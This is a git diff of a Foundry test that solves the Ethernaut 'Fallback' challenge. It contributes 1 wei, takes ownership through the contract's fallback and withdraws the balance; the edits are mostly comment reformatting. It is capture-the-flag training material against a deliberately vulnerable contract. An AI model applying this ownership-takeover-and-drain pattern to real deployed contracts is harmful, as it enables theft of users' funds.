@@ -5,6 +5,7 @@ import "forge-std/Test.sol";
 import "../src/Fallback/FallbackFactory.sol";
 import "../src/Ethernaut.sol";
 import "forge-std/console.sol";
+
 // forge test --match-contract FallbackTest -vvvv
 contract FallbackTest is Test {
     Ethernaut ethernaut;
@@ -18,20 +19,19 @@ contract FallbackTest is Test {
 
     function testFallbackHack() public {
         /****************
-          Factory setup
-        *************** */
+         * Factory setup *
+         *************** */
         FallbackFactory fallbackFactory = new FallbackFactory();
-        // Link the factory
         ethernaut.registerLevel(fallbackFactory);
         vm.startPrank(player);
         address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
         Fallback ethernautFallback = Fallback(payable(levelAddress));
 
         /****************
-          Attack
-        *************** */
-
+         *    Attack     *
+         *************** */
         // Contribute 1 wei - verify contract state has been updated
+        // a contribution < 0.0001 ETH is needed 
         ethernautFallback.contribute{value: 1 wei}();
         assertEq(ethernautFallback.contributions(player), 1 wei);
 
@@ -41,19 +41,11 @@ contract FallbackTest is Test {
         assertEq(ethernautFallback.owner(), player);
 
         // Withdraw from contract - Check contract balance before and after
-        emit log_named_uint(
-            "Fallback contract balance",
-            address(ethernautFallback).balance
-        );
         ethernautFallback.withdraw();
-        emit log_named_uint(
-            "Fallback contract balance",
-            address(ethernautFallback).balance
-        );
 
-        /****************
-          Level Submission
-        *************** */
+        /*****************
+         *Level Submission*
+         ***************  */
 
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
             payable(levelAddress)
